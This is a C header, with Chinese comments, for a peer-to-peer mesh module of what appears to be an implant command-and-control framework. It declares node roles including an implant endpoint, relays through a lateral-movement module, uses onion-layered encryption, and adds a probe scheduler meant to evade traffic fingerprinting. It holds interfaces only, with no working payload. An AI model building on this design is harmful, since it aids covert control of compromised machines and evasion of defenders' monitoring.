#ifndef P2P_H
#define P2P_H

#include <stddef.h>
#include <stdint.h>

/*
 * 14_p2p —— P2P 网格：节点表 + 邻居图 + 路径路由 + 中继转发
 *
 * 分层约定（避免与 08_lateral 职责重叠）：
 *   本模块 = 节点管理 + 消息路由（控制面）
 *   08_lateral/proxy.c = 字节级双工转发（数据面），本模块直接调用，不重复实现
 */

#define P2P_NODE_ID_LEN   16
#define P2P_MAX_NODES     64
#define P2P_MAX_NEIGHBORS  8
#define P2P_ALIAS_LEN     32
#define P2P_HOST_LEN      64
#define P2P_MAX_HOPS      16
#define P2P_PUBKEY_LEN    32   /* X25519 静态公钥，洋葱层密钥协商用 */

/* 电路建立头（endpoint 发给首跳，每跳按自身 mesh 解析下一跳）：
 *   n_ids(u8) || ids[n_ids][16] || final_port(u16 LE) || host_len(u8) || host
 * 语义：ids 为**含首跳**的待穿越节点序列；每跳校验 ids[0]==自身，
 *       弹掉自身后将剩余 ids + 最终目标(host:port) 转发给下一跳。
 * 最后一跳（n_ids==1，仅剩自己）直接连最终目标。 */
#define P2P_ROUTE_HDR_MAX_IDS 16

typedef enum {
    P2P_ROLE_ENDPOINT = 0,   /* 植入体，只发起，不转发 */
    P2P_ROLE_EDGE     = 1,   /* 边缘跳板，对外可达 */
    P2P_ROLE_CORE     = 2    /* 核心节点，汇聚 */
} p2p_role_t;

typedef enum {
    P2P_OK           =   0,
    P2P_ERR_ARGS     =  -1,
    P2P_ERR_NOTFOUND =  -3,
    P2P_ERR_FULL     =  -4,
    P2P_ERR_EXISTS   =  -5,
    P2P_ERR_NOLINK   =  -6,
    P2P_ERR_NOROUTE  =  -7,
    P2P_ERR_UNREACH  =  -8
} p2p_err_t;

typedef struct {
    uint8_t   id[P2P_NODE_ID_LEN];
    char      alias[P2P_ALIAS_LEN];
    p2p_role_t role;
    char      host[P2P_HOST_LEN];
    uint16_t  port;
    int       alive;                                  /* 0 = 故障，不参与路由 */
    uint8_t   neighbors[P2P_MAX_NEIGHBORS][P2P_NODE_ID_LEN];
    int       n_neighbors;

    /* 链路质量：与 neighbors[k] 一一对应的边度量（无向边，双向同步写入）
     * rtt_ewma / jitter 采用定点 x16（真实值 = 存储值 / 16），
     * 避免整数除法把小数直接抹成 0 —— 亚毫秒差异在整数域下会完全消失。 */
    uint32_t  nbr_rtt[P2P_MAX_NEIGHBORS];       /* 最近一次 RTT（ms） */
    uint32_t  nbr_rtt_ewma[P2P_MAX_NEIGHBORS];  /* EWMA RTT，定点 x16 */
    uint32_t  nbr_jitter[P2P_MAX_NEIGHBORS];    /* RFC3550 抖动，定点 x16 */
    uint32_t  nbr_bw[P2P_MAX_NEIGHBORS];        /* 带宽 kbps，0 = 未知 */
    uint32_t  nbr_ok[P2P_MAX_NEIGHBORS];        /* 成功计数 */
    uint32_t  nbr_fail[P2P_MAX_NEIGHBORS];      /* 失败计数（丢包惩罚依据） */

    /* 探测调度状态：与邻居边同下标，增删边时必须同步维护（同上） */
    uint32_t  nbr_lastprobe[P2P_MAX_NEIGHBORS]; /* 上次探测时刻（ms，单调时钟） */
    uint32_t  nbr_pbackoff[P2P_MAX_NEIGHBORS];  /* 探测退避（ms），失败指数增长 */

    /* 洋葱层密钥用的静态 X25519 公钥（私钥不进 mesh，只留在本跳本地）。
     * 层密钥 = HKDF(salt, IKM = X25519(sk_i, eph_pub_i) || my_id, ...)
     * —— 不再存在全网共享的 master，攻破一跳解不出其他跳。 */
    uint8_t   pub[P2P_PUBKEY_LEN];
    int       has_pub;
} p2p_node_t;

/* ---- QoS 代价模型参数 ----
 * cost = HOP_BASE(每跳基础)
 *      + rtt_ewma(x16 -> /16)
 *      + jitter(x16 -> /16) * JITTER_W
 *      + fail * FAIL_PENALTY
 *      + (bw > 0 ? BW_REF / bw : BW_UNKNOWN)
 *
 * 带宽项的设计理由：RTT 低但带宽窄的链路（如高延迟卫星 vs 低速专线）
 * 在纯时延模型下会被误判为优质，加入 1/bw 项后大流量场景会自然避开。 */
#define P2P_QOS_HOP_BASE      100
#define P2P_QOS_FAIL_PENALTY  500
#define P2P_QOS_JITTER_W        4   /* 抖动权重：抖动比均值更影响交互体验 */
/* 带宽项：传 P2P_QOS_BW_REF_BYTES 字节所需毫秒 = bytes*8 / bw_kbps。
 * 用物理量纲而不是无量纲常数，原因是整数除法会把高速链路的带宽项抹成 0：
 * 旧式 BW_REF/bw 在回环（百万 kbps 级）下恒为 0，快慢链路完全区分不出来。 */
#define P2P_QOS_BW_REF_BYTES 65536  /* 参考负载 64KB（典型命令+回传结果量级） */
#define P2P_QOS_BW_UNKNOWN    300   /* 带宽未知时的固定惩罚 */

/* EWMA 平滑系数 alpha = 1/8（定点 x16 下：new = old*7/8 + rtt*2） */
#define P2P_QOS_EWMA_SHIFT      3

typedef struct {
    p2p_node_t nodes[P2P_MAX_NODES];
    int        n_nodes;
} p2p_mesh_t;

const char *p2p_errstr(int e);

/* ---- 节点管理 ---- */
int  p2p_mesh_init(p2p_mesh_t *m);
int  p2p_node_add(p2p_mesh_t *m, const uint8_t *id, p2p_role_t role,
                  const char *alias, const char *host, uint16_t port);
int  p2p_node_del(p2p_mesh_t *m, const uint8_t *id);
int  p2p_node_find(const p2p_mesh_t *m, const uint8_t *id);
int  p2p_node_mark_dead(p2p_mesh_t *m, const uint8_t *id);
int  p2p_node_mark_alive(p2p_mesh_t *m, const uint8_t *id);
int  p2p_node_count(const p2p_mesh_t *m, p2p_role_t role);

/* ---- 静态公钥（洋葱层密钥协商用） ----
 * set 只登记公钥；私钥由各跳本地持有，不进 mesh、不跨节点传输。 */
int  p2p_node_set_pub(p2p_mesh_t *m, const uint8_t *id,
                      const uint8_t pub[P2P_PUBKEY_LEN]);
int  p2p_node_get_pub(const p2p_mesh_t *m, const uint8_t *id,
                      uint8_t out[P2P_PUBKEY_LEN]);

/* ---- 邻居关系（无向，双向写入） ---- */
int  p2p_neighbor_link(p2p_mesh_t *m, const uint8_t *a, const uint8_t *b);
int  p2p_neighbor_unlink(p2p_mesh_t *m, const uint8_t *a, const uint8_t *b);
int  p2p_neighbor_has(const p2p_mesh_t *m, const uint8_t *a, const uint8_t *b);

/* ---- 主动带宽探测 ----
 *
 * 测量方式：连上邻跳 -> 全量写出 bytes 字节 -> shutdown(SHUT_WR)
 *           -> 等对端 1 字节回执 -> 用总耗时算吞吐。
 * 必须对端回执，否则测到的是"本地发送缓冲区有多大"，不是链路带宽
 * （回环上 256KB 常常瞬间写进缓冲，不回执的话两者都快得测不出差异）。
 *
 * acked=0 表示超时未收到回执，此时 bw 只是**写侧估计**，可信度低于 acked=1。 */
int  p2p_probe_bandwidth(const char *host, uint16_t port, size_t bytes,
                         uint32_t *bw_kbps, int *acked);

/* 探测 a->b 的带宽并写入边度量（同时用于 QoS 代价模型的 1/bw 项） */
int  p2p_link_probe_bw(p2p_mesh_t *m, const uint8_t *a, const uint8_t *b,
                       size_t bytes, uint32_t *bw_kbps);

/* ---- 路由：BFS 最短路径，跳过故障节点 ----
 * path[] 输出从 from 的下一跳开始（不含 from），长度写入 n_hop。
 * 返回 P2P_OK 或 P2P_ERR_NOROUTE。 */
int  p2p_route_path(const p2p_mesh_t *m, const uint8_t *from, const uint8_t *dst,
                    uint8_t path[][P2P_NODE_ID_LEN], int max_hops, int *n_hop);

/* ---- 链路质量度量（按邻居边，无向，双向同步） ----
 * rtt_ms 为往返时延；ok/fail 为成功/失败计数，供丢包惩罚。
 * 度量数组与 neighbors[k] 同下标，任何增删边都必须同步维护三者。 */
int  p2p_link_set_rtt(p2p_mesh_t *m, const uint8_t *a, const uint8_t *b, uint32_t rtt_ms);
int  p2p_link_note(p2p_mesh_t *m, const uint8_t *a, const uint8_t *b, int ok);
int  p2p_link_metrics(const p2p_mesh_t *m, const uint8_t *a, const uint8_t *b,
                      uint32_t *rtt_ms, uint32_t *ok, uint32_t *fail);

/* ---- 扩展度量：EWMA / 抖动 / 带宽 ----
 * rtt_ewma、jitter 为定点 x16（真实值 = 值 / 16）。
 * 传入 rtt_ms 会同时推进 EWMA 与 RFC3550 抖动估计：
 *   EWMA  : e = e - (e >> 3) + (rtt << 4 >> 3)     （alpha = 1/8）
 *   Jitter: j = j - (j >> 4) + (|rtt - prev| << 4 >> 4)  （RFC 3550，1/16）
 * 首次测量时 EWMA 直接置为 rtt<<4，jitter 置 0。
 * bw_kbps 为 0 表示未知（代价模型走 BW_UNKNOWN 惩罚）。 */
int  p2p_link_update_rtt(p2p_mesh_t *m, const uint8_t *a, const uint8_t *b,
                         uint32_t rtt_ms);
int  p2p_link_set_bw(p2p_mesh_t *m, const uint8_t *a, const uint8_t *b,
                     uint32_t bw_kbps);
int  p2p_link_get_qos(const p2p_mesh_t *m, const uint8_t *a, const uint8_t *b,
                      uint32_t *rtt_ewma, uint32_t *jitter,
                      uint32_t *bw_kbps, uint32_t *ok, uint32_t *fail);

/*
 * 主动探测：对邻居 host:port 做真实 TCP connect 并计时，把结果喂给 EWMA。
 * 这是"无主动探测"限制的解除 —— RTT 不再需要外部测量后手工 set。
 * 探测失败会累加 fail 计数（丢包惩罚生效），返回 P2P_ERR_UNREACH。
 */
int  p2p_link_probe(p2p_mesh_t *m, const uint8_t *a, const uint8_t *b,
                    uint32_t *rtt_ms);

/* 全图探测：对 a 的所有邻居逐个 p2p_link_probe，返回成功探测数 */
int  p2p_link_probe_all(p2p_mesh_t *m, const uint8_t *a, int *n_probed);

/* ====================================================================
 * 探测调度：低频 + 错峰（解除"带宽探测主动发包本身可观测"的限制）
 * ====================================================================
 * 主动探测必然产生额外流量。若周期性对全图探测，这些流量本身就成为
 * 可识别的行为指纹（"每 N 秒一轮连接"）。调度器从三处削弱可观测性：
 *
 *   1. 低频：每条边有最小探测间隔 base_ms，未到期不探测
 *   2. 抖动：到期判定叠加 [0, jitter_ms) 随机量，探测时刻不再是等间距
 *   3. 错峰：一轮内按**随机顺序**遍历邻居，不按固定序列逐个探测
 *   4. 退避：失败的边指数退避（上限 max_backoff_ms），不再高频重试不可达边
 *
 * 边界：低频意味着度量新鲜度下降，抖动意味着探测时刻不可预测 ——
 * 这是"可观测性"与"度量时效"的显式取舍，不是免费的。
 */
typedef struct {
    uint32_t s;                 /* xorshift32 状态 */
    uint32_t base_ms;           /* 每条边最小探测间隔 */
    uint32_t jitter_ms;         /* 到期判定附加随机量上限 */
    uint32_t max_backoff_ms;    /* 失败退避上限 */
} p2p_probesched_t;

int  p2p_probesched_init(p2p_probesched_t *ps, uint32_t seed,
                         uint32_t base_ms, uint32_t jitter_ms,
                         uint32_t max_backoff_ms);

/*
 * 该边此刻是否到期可探测。
 * 判据：now - last >= base + 该边退避 + rand[0, jitter)
 * 从未探测过的边（last == 0）总是到期。
 */
int  p2p_probe_due(p2p_probesched_t *ps, const p2p_mesh_t *m,
                   const uint8_t *a, const uint8_t *b, uint32_t now_ms);

/*
 * 记录一次探测结果：更新 last，成功则清零退避，失败则退避翻倍
 * （上限取 ps->max_backoff_ms）。
 */
int  p2p_probe_mark(p2p_probesched_t *ps, p2p_mesh_t *m,
                    const uint8_t *a, const uint8_t *b,
                    uint32_t now_ms, int ok);

/*
 * 错峰全图探测：按随机顺序遍历 a 的邻居，只探测到期的那些。
 * 返回 P2P_OK，n_probed 为本轮实际探测成功的边数，n_skipped 为本轮跳过的
 * （未到期）边数 —— 跳过是正常行为，正是"低频"的体现。
 */
int  p2p_probe_all_staggered(p2p_probesched_t *ps, p2p_mesh_t *m,
                             const uint8_t *a, uint32_t now_ms,
                             int *n_probed, int *n_skipped);

/* 给定度量计算 QoS 代价（供测试直接对照代价模型） */
uint32_t p2p_qos_cost(uint32_t rtt_ewma_x16, uint32_t jitter_x16,
                      uint32_t bw_kbps, uint32_t fail_count);

/* ---- 路由：Dijkstra 按链路质量选路（RTT + 失败惩罚） ----
 * 与 p2p_route_path（BFS 最少跳数）并存：
 *   代价相同时 QoS 退化为最少跳；时延/丢包差异大时 QoS 会绕开劣质链路。 */
int  p2p_route_path_qos(const p2p_mesh_t *m, const uint8_t *from, const uint8_t *dst,
                        uint8_t path[][P2P_NODE_ID_LEN], int max_hops, int *n_hop);

/* ---- 数据面：委托 08_lateral 的 poll 双工中继 ----
 * idle_ms <= 0 表示无超时。 */
int  p2p_relay(int cfd, int tfd, int idle_ms);

/* ====================================================================
 * 电路建立：QoS 算路 -> 逐跳动态转发（QoS 与数据面联动）
 * ==================================================================== */

/* 取节点监听地址（host/port），供建连；未找到返回 P2P_ERR_NOTFOUND */
int  p2p_node_endpoint(const p2p_mesh_t *m, const uint8_t *id,
                       const char **host, uint16_t *port);

/* 构造电路头。ids_flat 为 n_ids 个节点 ID 的连续缓冲（n_ids*16 字节）。
 * out 可为 NULL（仅探测长度）。host 为最终目标（如回显服务）。 */
int  p2p_route_build_hdr(const uint8_t *ids_flat, int n_ids,
                         const char *final_host, uint16_t final_port,
                         uint8_t *out, size_t cap, size_t *len);

/* 解析电路头。host_cap 需 >= host_len+1 */
int  p2p_route_parse_hdr(const uint8_t *in, size_t len,
                         uint8_t ids[][P2P_NODE_ID_LEN], int max_ids, int *n_ids,
                         char *final_host, size_t host_cap, uint16_t *final_port);

/*
 * 中继一跳：读电路头 -> 校验自身 -> 解析下一跳 -> 建连 -> 转发剩余头 -> 双工中继。
 * 这是 QoS 与数据面的联动点：路径由 p2p_route_path_qos 算出，
 * 每一跳按自己 mesh 里的邻居地址真实建连，不是测试里手工串的进程。
 */
int  p2p_route_handle_conn(const p2p_mesh_t *m, const uint8_t *my_id, int cfd);

/* 监听循环：accept 后 fork 子进程处理一条电路 */
void p2p_route_serve(const p2p_mesh_t *m, const uint8_t *my_id, int listen_fd);

/*
 * 发起端：按 QoS 算路 -> 连首跳 -> 发电路头，返回可直接收发的应用 fd。
 * 成功后 *out_fd 即对最终目标的端到端隧道（中间跳只转发密文/字节）。
 */
int  p2p_route_open(const p2p_mesh_t *m, const uint8_t *from, const uint8_t *dst,
                    const char *final_host, uint16_t final_port, int *out_fd);

/* ====================================================================
 * 洋葱路由：分层加密，中间跳看不到完整路径与最终目标
 * （解除"电路头对中间跳可见"的限制，详见 p2p_onion.h）
 * ==================================================================== */
#include "p2p_onion.h"

/*
 * 发起端：QoS 算路 -> 逐层包裹洋葱 -> 连首跳 -> 发电路头。
 * salt 由调用方提供（每条电路应随机），明文携带，用于派生各跳层密钥。
 * 成功后 *out_fd 即对最终目标的端到端隧道。
 */
int  p2p_onion_route_open(const p2p_mesh_t *m, const uint8_t *from,
                          const uint8_t *dst,
                          const char *final_host, uint16_t final_port,
                          const uint8_t salt[P2P_ONION_SALT_LEN],
                          int *out_fd);

/* 中继一跳：剥开自己那层 -> 连下一跳（或最终目标）-> 转发剩余洋葱 -> 双工中继 */
int  p2p_onion_route_handle(const p2p_mesh_t *m, const uint8_t *my_id,
                            const uint8_t sk[P2P_ONION_SK_LEN], int cfd);

/* 洋葱版监听循环 */
void p2p_onion_route_serve(const p2p_mesh_t *m, const uint8_t *my_id,
                           const uint8_t sk[P2P_ONION_SK_LEN],
                           int listen_fd);

#endif /* P2P_H */
